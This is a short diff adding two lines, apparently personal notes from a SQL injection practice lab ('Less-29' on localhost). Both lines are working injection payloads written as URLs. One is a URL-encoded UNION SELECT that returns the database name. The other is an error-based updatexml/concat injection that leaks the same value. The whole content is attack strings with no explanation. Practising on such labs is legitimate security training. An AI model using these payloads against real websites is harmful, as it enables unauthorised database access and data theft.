@@ -1,0 +1,3 @@
+>>>http://127.0.0.1/sql/Less-29/?id=45%27%20union%20select%201,database(),1%20or%20%271%27=%271
+
+>>>127.0.0.1/sql/Less-29/?id=5' or updatexml(1,concat(0x7e,database(),0x7e),1) or '1'='1
